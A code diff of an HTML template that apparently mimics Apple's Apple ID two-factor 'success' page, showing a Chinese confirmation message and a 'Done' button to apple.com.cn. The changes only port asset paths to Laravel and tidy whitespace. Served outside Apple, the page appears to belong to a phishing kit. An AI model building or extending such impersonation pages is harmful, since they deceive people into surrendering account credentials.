@@ -7,13 +7,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
 
-    <link rel="stylesheet" href="__Public__/fonts/fontss.css" type="text/css">
+    <link rel="stylesheet" href="{{ asset('/fonts/fontss.css') }}" type="text/css">
 
-    <link rel="stylesheet" type="text/css" media="screen" href="__Public__/css/app-sk7.css">
+    <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/app-sk7.css') }}">
 
 
     <style type="text/css">
-        
+
          .success-icon-wrap {
             margin-bottom: 26px;
         }
@@ -37,7 +37,7 @@
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
         }
-        
+
     </style>
 </head>
 
@@ -51,9 +51,9 @@
         <apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
 
             <div class="success-icon-wrap" width="300px"><i class="icon icon_green_check success xl desktop"></i></div>
-            
-            
-            
+
+
+
 
 
              <div class="table-responsive">
@@ -61,11 +61,11 @@
                 <br>
                 <p class="as-center" style="color:blue">您的Apple ID已经启用双重验证无需重复开启。</p>
             </div>
-        <br>    
+        <br>
             <a href="https://www.apple.com.cn/" target="_blank" class="nav text-centered">
                 <button role="button" class="button iforgot-btn done">完成</button>
             </a>
-            
+
             <idms-modal wrap-class="full-page-error-wrapper " {(show)}="showfullPageError" auto-close="false">
             </idms-modal>
         </apple-auth>
